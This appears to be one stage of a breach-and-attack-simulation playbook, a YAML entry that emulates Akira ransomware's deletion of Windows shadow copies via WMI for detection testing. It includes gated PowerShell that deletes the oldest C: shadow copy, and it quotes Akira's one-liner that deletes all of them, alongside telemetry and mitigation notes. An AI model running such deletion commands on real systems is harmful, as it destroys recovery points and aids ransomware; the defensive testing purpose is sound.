  # ===========================================================================
  # Stage 8 — Recovery Inhibition B: VSS Deletion via WMI (T1490, lab-only)
  # ===========================================================================
  - id: akira-s8-vss-wmi-delete
    name: "Akira Stage 8 — VSS Shadow Copy Deletion via WMI (lab  -  requires BAS_CONFIRM_VSS_DELETE=true) (T1490)"
    technique_id: T1490
    action_key: vss_delete
    detection_profiles:
      - windows_vss_inhibition
    framework: custom
    executor: powershell
    requires_priv: admin
    timeout_sec: 60
    fidelity: lab-only
    production_safe: false
    risk: high
    severity: critical
    confidence: high
    reversible: false
    depends_on: [akira-s7-vss-enum]
    blast_radius: "Deletes ONE oldest VSS shadow copy of C: via WMI Win32_ShadowCopy.Delete() -- Akira's exact documented command style (CISA AA24-109A: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}'), as opposed to LockBit/BlackCat's vssadmin-based deletion. Requires explicit BAS_CONFIRM_VSS_DELETE=true env var and verifies a snapshot exists first. Default-disabled without the flag."
    preconditions: ["Admin privilege.", "BAS_CONFIRM_VSS_DELETE=true.", "Isolated lab environment.", "At least one C: shadow copy exists."]
    postconditions: ["At most one oldest C: shadow copy deleted; remaining count emitted."]
    abort_on:
      - "BAS_CONFIRM_VSS_DELETE != 'true' → SKIP"
      - "No C: shadow copies → SKIP"
    telemetry:
      - "Security EID 8224 (VSS service shutdown) + EID 524 (shadow copy deletion)"
      - "PowerShell EID 4104: Get-WmiObject Win32_ShadowCopy | ForEach-Object Delete()"
    detection:
      - "EDR: PowerShell WMI-based shadow copy deletion (Win32_ShadowCopy.Delete())  -  Akira's documented signature VSS-kill pattern, distinct from vssadmin.exe"
      - "SIEM: shadow copy count decrease; alert if count drops to 0"
    expected_telemetry_count: 2
    false_positive_notes: "Storage-management scripts use Win32_ShadowCopy.Delete() — require change-window correlation."
    mitigations:
      - "Alert on Win32_ShadowCopy.Delete() from PowerShell."
      - "Immutable offsite backups; restrict shadow-copy management to dedicated accounts."
    references: ["CISA AA24-109A", "MITRE T1490"]
    evidence: ["Emit deleted_shadow_count + remaining."]
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $confirm = $env:BAS_CONFIRM_VSS_DELETE
      if (-not $confirm -or $confirm -cne 'true') {
        Write-Output "SKIP: BAS_CONFIRM_VSS_DELETE not set to 'true'  -  WMI-based VSS deletion skipped (default-disabled per ransomware safety policy). Set env var explicitly in isolated lab to enable. recovery_protection=not_evaluated (a skipped deletion test is NOT evidence that recovery is protected). [BAS-SIM-AKIRA-S8]"
        return
      }
      # Win32_ShadowCopy.VolumeName is a \\?\Volume{GUID}\ path, never a drive letter: resolve C: to its volume DeviceID first.
      $vol = Get-WmiObject Win32_Volume -Filter "DriveLetter='C:'" -ErrorAction SilentlyContinue
      $deviceId = $vol.DeviceID
      $shadows = @()
      if ($deviceId) { $shadows = @(Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object { $_.VolumeName -eq $deviceId }) }
      if (-not $deviceId) {
        Write-Output "SKIP: prerequisite missing (could not resolve the C: volume to query its shadow copies); recovery_protection=not_evaluated. [BAS-SIM-AKIRA-S8]"
        return
      }
      if ($shadows.Count -eq 0) {
        Write-Output "SKIP: no C: VSS shadow copies exist  -  nothing to delete. recovery_point_available=False recovery_protection=not_evaluated. Create a snapshot first with: vssadmin create shadow /for=C:"
        return
      }
      $before = $shadows.Count
      $oldest = @($shadows | Sort-Object InstallDate)[0]
      $targetId = $oldest.ID
      [void]$oldest.Delete()
      $afterList = @(Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object { $_.VolumeName -eq $deviceId })
      $stillPresent = [bool](@($afterList | Where-Object { $_.ID -eq $targetId }).Count)
      $deleted = -not $stillPresent
      Write-Output "EVIDENCE T1490: targeted_copy_id=$targetId before=$before after=$($afterList.Count) deletion_verified=$deleted (re-queried after Delete()). [BAS-SIM-AKIRA-S8]"
      if ($deleted) {
        Write-Output "FAIL: VSS shadow copy $targetId deleted via WMI Win32_ShadowCopy.Delete() and confirmed gone by re-query -- Akira's documented command is 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {\$_.Delete()}'. $($afterList.Count) shadow copy/copies remaining on C:. Create a new snapshot to restore recovery capability. [BAS-SIM-AKIRA-S8]"
      } else {
        Write-Output "PASS: Delete() was invoked but shadow copy $targetId is still present on re-query (deletion_verified=False) - the WMI deletion was blocked or had no effect. [BAS-SIM-AKIRA-S8]"
      }
    cleanup: ""

